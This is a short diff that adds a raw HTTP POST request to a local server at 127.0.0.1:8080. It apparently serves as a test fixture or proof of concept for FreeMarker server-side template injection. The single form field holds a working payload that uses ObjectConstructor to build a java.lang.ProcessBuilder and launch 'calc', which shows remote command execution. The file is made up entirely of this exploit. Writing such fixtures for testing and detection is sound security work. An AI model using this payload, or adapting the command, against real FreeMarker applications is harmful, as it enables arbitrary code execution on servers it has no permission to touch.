@@ -1,0 +1,8 @@
+POST /test1 HTTP/1.1
+Host: 127.0.0.1:8080
+Accept: text/html
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 134
+
+templateContent=  <#assign var="freemarker.template.utility.ObjectConstructor"?new()>${var("java.lang.ProcessBuilder","calc").start()}
